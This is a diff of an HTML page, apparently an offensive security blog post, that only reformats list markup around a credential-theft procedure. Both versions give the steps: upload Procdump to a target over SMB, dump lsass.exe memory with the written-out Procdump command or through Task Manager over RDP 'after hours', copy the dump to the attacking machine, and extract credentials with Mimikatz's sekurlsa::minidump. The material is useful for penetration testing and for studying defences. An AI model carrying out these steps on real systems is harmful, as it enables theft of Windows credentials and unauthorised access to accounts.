@@ -182,18 +182,19 @@ Once you get the file locally you'll wanna get it to a local Windows system that
 
 <ol>
 <li>Wait a while for the target user to auth to their system</li>
-<li>Use smbclient or Crackmapexec or whatever to upload <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> and dump lsass with it:<br />
-<code>bash
-C:\users\ANOTHER-USER\desktop\procdump.exe -accepteula -ma lsass.exe lsass.dmp
-</code>
-<b> OR&hellip;</b></li>
-</ol></li>
+<li>Use smbclient or Crackmapexec or whatever to upload <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a> and dump lsass with it:<br /></li>
+</ol>
 
-<li><p>After hours, RDP in to the target system ➡ Open Task-manager and go to Details tab ➡ Right mouse-click and dump lsass.exe</p></li>
+<pre><code class="language-bash">C:\users\ANOTHER-USER\desktop\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre></li>
+</ol>
 
-<li><p>Download the dump file to your attacking machine</p></li>
+<p><b> OR&hellip;</b>
+4. After hours, RDP in to the target system ➡ Open Task-manager and go to Details tab ➡ Right mouse-click and dump lsass.exe</p>
 
-<li><p>Use Mimikatz locally and dump the file using the following commands:</p></li>
+<ol>
+<li>Download the dump file to your attacking machine</li>
+<li>Use Mimikatz locally and dump the file using the following commands:</li>
 </ol>
 
 <pre><code class="language-bash">mimikatz $ sekurlsa::minidump YOUR_DUMP_FILE.dmp
